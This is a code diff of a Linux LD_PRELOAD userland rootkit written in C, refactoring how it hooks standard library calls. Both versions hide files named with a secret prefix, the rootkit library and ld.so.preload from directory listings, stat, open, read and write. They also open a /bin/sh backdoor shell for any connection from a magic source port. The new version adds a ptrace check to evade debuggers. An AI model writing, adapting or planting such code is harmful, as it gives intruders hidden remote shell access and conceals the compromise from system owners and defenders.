@@ -1,116 +1,120 @@
 #include "rootkit.h"
 
-bool check_rootkit_file(const char *d_name) {
-    const char *restricted_list[] = {"config", "rootkit", "secret"};
-    int len = sizeof(restricted_list) / sizeof(restricted_list[0]);
-    for (int i = 0; i < len; i++) {
-        if (strcmp(d_name, restricted_list[i]) == 0) {
-            return true;
-        }
-    }
-    return false;
+static void *get_orig(const char *name) {
+    return dlsym(RTLD_NEXT, name);
+}
+
+static int is_stealth_active(void) {
+    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) return 1;
+    ptrace(PTRACE_DETACH, 0, 1, 0);
+    return 0;
+}
+
+static int is_hidden(const char *name) {
+    if (!name) return 0;
+    if (strstr(name, HIDDEN_PREFIX)) return 1;
+    if (strstr(name, EVIL_LIB)) return 1;
+    if (strstr(name, "ld.so.preload")) return 1;
+    return 0;
 }
 
 struct dirent *readdir(DIR *dirp) {
-    orig_readdir_func_type orig_readdir_func = (orig_readdir_func_type)dlsym(RTLD_NEXT, "readdir");
-    struct dirent *dir;
-    while (1) {
-        dir = orig_readdir_func(dirp);
-        if (dir == NULL) return NULL;
-        if (check_rootkit_file(dir->d_name)) continue;
-        break;
+    if (is_stealth_active()) return ((orig_readdir_t)get_orig("readdir"))(dirp);
+    orig_readdir_t orig = get_orig("readdir");
+    struct dirent *e;
+    while ((e = orig(dirp))) {
+        if (!is_hidden(e->d_name)) return e;
     }
-    return dir;
+    return NULL;
 }
 
-int inspect_and_shell(int client_fd, struct sockaddr *addr) {
-    if (client_fd >= 0 && addr != NULL) {
-        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
-        if (ntohs(addr_in->sin_port) == MAGIC_SOURCE_PORT) {
+ssize_t read(int fd, void *buf, size_t count) {
+    orig_read_t orig = get_orig("read");
+    ssize_t n = orig(fd, buf, count);
+    if (n > 0 && !is_stealth_active()) {
+        char *p = memmem(buf, n, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX));
+        if (p) memset(buf, 0, n); 
+        if (memmem(buf, n, EVIL_LIB, strlen(EVIL_LIB))) memset(buf, 0, n);
+    }
+    return n;
+}
+
+int __xstat(int ver, const char *path, struct stat *buf) {
+    orig_xstat_t orig = get_orig("__xstat");
+    if (!is_stealth_active() && is_hidden(path)) {
+        int r = orig(ver, path, buf);
+        buf->st_size = 0;
+        return r;
+    }
+    return orig(ver, path, buf);
+}
+
+int stat(const char *path, struct stat *buf) {
+    orig_stat_t orig = get_orig("stat");
+    if (!is_stealth_active() && is_hidden(path)) {
+        int r = orig(path, buf);
+        buf->st_size = 0;
+        return r;
+    }
+    return orig(path, buf);
+}
+
+int open(const char *path, int flags, ...) {
+    orig_open_t orig = get_orig("open");
+    const char *new_path = path;
+    if (!is_stealth_active() && is_hidden(path)) new_path = "/dev/null";
+    
+    if (flags & O_CREAT) {
+        va_list a; va_start(a, flags);
+        mode_t m = va_arg(a, mode_t);
+        va_end(a);
+        return orig(new_path, flags, m);
+    }
+    return orig(new_path, flags);
+}
+
+int accept(int fd, struct sockaddr *sa, socklen_t *len) {
+    orig_accept_t orig = get_orig("accept");
+    int cfd = orig(fd, sa, len);
+    if (cfd >= 0 && sa && sa->sa_family == AF_INET) {
+        struct sockaddr_in *s = (struct sockaddr_in *)sa;
+        if (ntohs(s->sin_port) == MAGIC_PORT) {
             if (fork() == 0) {
-                dup2(client_fd, 0); 
-                dup2(client_fd, 1); 
-                dup2(client_fd, 2); 
-                char *args[] = {"/bin/sh", NULL};
-                execve("/bin/sh", args, NULL);
+                dup2(cfd, 0); dup2(cfd, 1); dup2(cfd, 2);
+                execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
                 exit(0);
             }
-            close(client_fd);
-            return -1; 
+            close(cfd);
+            return -1;
         }
     }
-    return client_fd; 
+    return cfd;
 }
 
-int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
-    orig_accept_func_type orig_accept = (orig_accept_func_type)dlsym(RTLD_NEXT, "accept");
-    int client_fd = orig_accept(sockfd, addr, addrlen);
-    return inspect_and_shell(client_fd, addr);
+int accept4(int fd, struct sockaddr *sa, socklen_t *len, int flags) {
+    orig_accept4_func_type orig = (orig_accept4_func_type)get_orig("accept4");
+    int cfd = orig(fd, sa, len, flags);
+    if (cfd >= 0 && sa && sa->sa_family == AF_INET) {
+        struct sockaddr_in *s = (struct sockaddr_in *)sa;
+        if (ntohs(s->sin_port) == MAGIC_PORT) {
+            if (fork() == 0) {
+                dup2(cfd, 0); dup2(cfd, 1); dup2(cfd, 2);
+                execve("/bin/sh", (char *[]){"/bin/sh", NULL}, NULL);
+                exit(0);
+            }
+            close(cfd);
+            return -1;
+        }
+    }
+    return cfd;
 }
 
-int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags) {
-    orig_accept4_func_type orig_accept4 = (orig_accept4_func_type)dlsym(RTLD_NEXT, "accept4");
-    int client_fd = orig_accept4(sockfd, addr, addrlen, flags);
-    return inspect_and_shell(client_fd, addr);
-}
 
 ssize_t write(int fd, const void *buf, size_t count) {
-    orig_write_func_type orig_write = (orig_write_func_type)dlsym(RTLD_NEXT, "write");
-    if (buf == NULL || count <= 0) {
-        return orig_write(fd, buf, count);
+    orig_write_t orig = get_orig("write");
+    if (!is_stealth_active() && buf && count > 0) {
+        if (memmem(buf, count, HIDDEN_PREFIX, strlen(HIDDEN_PREFIX)) ||
+            memmem(buf, count, EVIL_LIB, strlen(EVIL_LIB))) return count;
     }
-
-    char temp_buf[8192] = {0};
-    size_t copy_len = count < sizeof(temp_buf) - 1 ? count : sizeof(temp_buf) - 1;
-    memcpy(temp_buf, buf, copy_len);
-    temp_buf[copy_len] = '\0';
-
-    const char *restricted_list[] = {"config", "rootkit", "secret"};
-    int num_hidden = sizeof(restricted_list) / sizeof(restricted_list[0]);
-    
-    for (int i = 0; i < num_hidden; i++) {
-        if (strstr(temp_buf, restricted_list[i]) != NULL) {
-            return count; 
-        }
-    }
-
-    return orig_write(fd, buf, count);
-}
-
-
-int open(const char *pathname, int flags, ...) {
-    orig_open_func_type orig_open = (orig_open_func_type)dlsym(RTLD_NEXT, "open");
-    mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode = va_arg(args, mode_t);
-        va_end(args);
-    }
-
-    if (strstr(pathname, "ld.so.preload") != NULL || strstr(pathname, "libsystemd-auth.so") != NULL) {
-        pathname = "/dev/null"; 
-    }
-
-    if (flags & O_CREAT) return orig_open(pathname, flags, mode);
-    return orig_open(pathname, flags);
-}
-
-int openat(int dirfd, const char *pathname, int flags, ...) {
-    orig_openat_func_type orig_openat = (orig_openat_func_type)dlsym(RTLD_NEXT, "openat");
-    
-    mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode = va_arg(args, mode_t);
-        va_end(args);
-    }
-
-    if (strstr(pathname, "ld.so.preload") != NULL || strstr(pathname, "libsystemd-auth.so") != NULL) {
-        pathname = "/dev/null";
-    }
-
-    if (flags & O_CREAT) return orig_openat(dirfd, pathname, flags, mode);
-    return orig_openat(dirfd, pathname, flags);
+    return orig(fd, buf, count);
 }
